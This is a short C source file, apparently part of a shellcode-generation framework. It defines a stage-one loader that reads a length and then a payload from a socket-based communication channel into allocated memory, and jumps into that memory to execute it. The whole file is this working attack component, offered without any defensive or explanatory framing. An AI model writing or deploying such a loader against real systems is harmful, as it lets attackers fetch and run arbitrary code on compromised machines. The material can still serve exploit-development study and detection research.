#include <factory.h>
#include "helpers/fs.c"
#include "helpers/socket.c"
#include "helpers/memory.c"

typedef __attribute__((noreturn)) void (* shellcode)(void);

SHELLCODE_ENTRY {

    struct channel chan = get_communication_channel();
    unsigned short buffer_size = 0, count = 0;
    unsigned char *memory;

    _read(chan.rx, &buffer_size, sizeof(buffer_size));
    memory = (unsigned char *) _malloc(buffer_size);

    while ( count < buffer_size && _read(chan.rx, memory+count, 1) >= 0 )
        count++;

    ((shellcode) memory)();

} SHELLCODE_END
